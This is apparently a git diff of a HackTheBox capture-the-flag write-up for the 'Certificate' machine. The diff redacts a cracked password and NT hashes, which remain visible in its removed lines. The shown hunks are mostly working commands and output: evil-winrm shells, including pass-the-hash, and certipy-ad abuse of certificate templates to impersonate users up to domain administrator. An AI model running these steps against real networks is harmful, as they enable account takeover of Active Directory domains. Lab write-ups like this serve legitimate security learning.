@@ -263,11 +263,11 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 
-We have the following credentials! `Lion.SK`:`!QAZ2wsx`
+We have the following credentials! `Lion.SK`:`[REDACTED]`
 
 Let's remote in using `evil-winrm`
 ```powershell
-evil-winrm -i certificate.htb -u Lion.SK -p '!QAZ2wsx'
+evil-winrm -i certificate.htb -u Lion.SK -p '[REDACTED]'
                                         
 Evil-WinRM shell v3.7
                                         
@@ -289,7 +289,7 @@ According to the description of `Domain CRA Managers`.
 
 So Let's look for vulnerable certificate templates.
 ```
-certipy-ad find -u lion.sk@certificate.htb -p '!QAZ2wsx' -target dc01.certificate.htb -dc-ip 10.129.238.176 -vulnerable 
+certipy-ad find -u lion.sk@certificate.htb -p '[REDACTED]' -target dc01.certificate.htb -dc-ip 10.129.238.176 -vulnerable 
 Certipy v5.0.2 - by Oliver Lyak (ly4k)
                                                                                                                       
 [*] Finding certificate templates
@@ -318,7 +318,7 @@ With these let's take note of the following:
 
 Let's grab a certificate for `Lion.SK`
 ```bash
-certipy-ad req -u "lion.sk@certificate.htb" -p '!QAZ2wsx' -dc-ip "10.129.238.176" -target "dc01.certificate.htb" -ca 'Certificate-LTD-CA' -template 'Delegated-CRA'
+certipy-ad req -u "lion.sk@certificate.htb" -p '[REDACTED]' -dc-ip "10.129.238.176" -target "dc01.certificate.htb" -ca 'Certificate-LTD-CA' -template 'Delegated-CRA'
 Certipy v5.0.2 - by Oliver Lyak (ly4k) 
 [*] Requesting certificate via RPC 
 [*] Request ID is 32 
@@ -331,7 +331,7 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
 Next let's grab a certificate for `Ryan`, however the current template work work so let's use `SignedUsers` instead.
 ```bash
-certipy-ad req -u lion.sk -p '!QAZ2wsx' -pfx 'lion.sk.pfx' -dc-ip "10.129.238.176" -target "dc01.certificate.htb" -ca 'Certificate-LTD-CA' -template 'SignedUser' -on-behalf-of 'certificate\ryan.k' -out 'ryan.k.pfx'
+certipy-ad req -u lion.sk -p '[REDACTED]' -pfx 'lion.sk.pfx' -dc-ip "10.129.238.176" -target "dc01.certificate.htb" -ca 'Certificate-LTD-CA' -template 'SignedUser' -on-behalf-of 'certificate\ryan.k' -out 'ryan.k.pfx'
 Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via RPC
@@ -359,12 +359,12 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 [*] Saving credential cache to 'ryan.k.ccache'
 [*] Wrote credential cache to 'ryan.k.ccache'
 [*] Trying to retrieve NT hash for 'ryan.k'
-[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6
+[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:[REDACTED]
 ```
 
 We can `winrm`
 ```powershell
-evil-winrm -i certificate.htb -u ryan.k -H b1bc3d70e70f4f36b1509a65ae1a2ae6                                                                                                                             
+evil-winrm -i certificate.htb -u ryan.k -H [REDACTED]
                                         
 Evil-WinRM shell v3.7
                                         
@@ -501,12 +501,13 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 [*] Saving credential cache to 'administrator.ccache'
 [*] Wrote credential cache to 'administrator.ccache'
 [*] Trying to retrieve NT hash for 'administrator'
-[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
+[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:[REDACTED]
 ```
 
 Just like that, we have Root!
 
 # Beyond Root
+
 I was really interested to know more about that `nullbyte` exploit. Looking around we can find [0xdf](https://0xdf.gitlab.io/2024/01/13/htb-zipping.html#beyond-root---unintended-footholds) did a similar thing on the `Zipping` box.
 
 I tried to do the manual method he showed where he used a `hex editor` to edit the bytes. Editing only the second instance of the `filename` generated errors when uploaded. However, if we edited both instances, we would be able to submit the file and not have to use a sacrificial zipfile as we did in python.
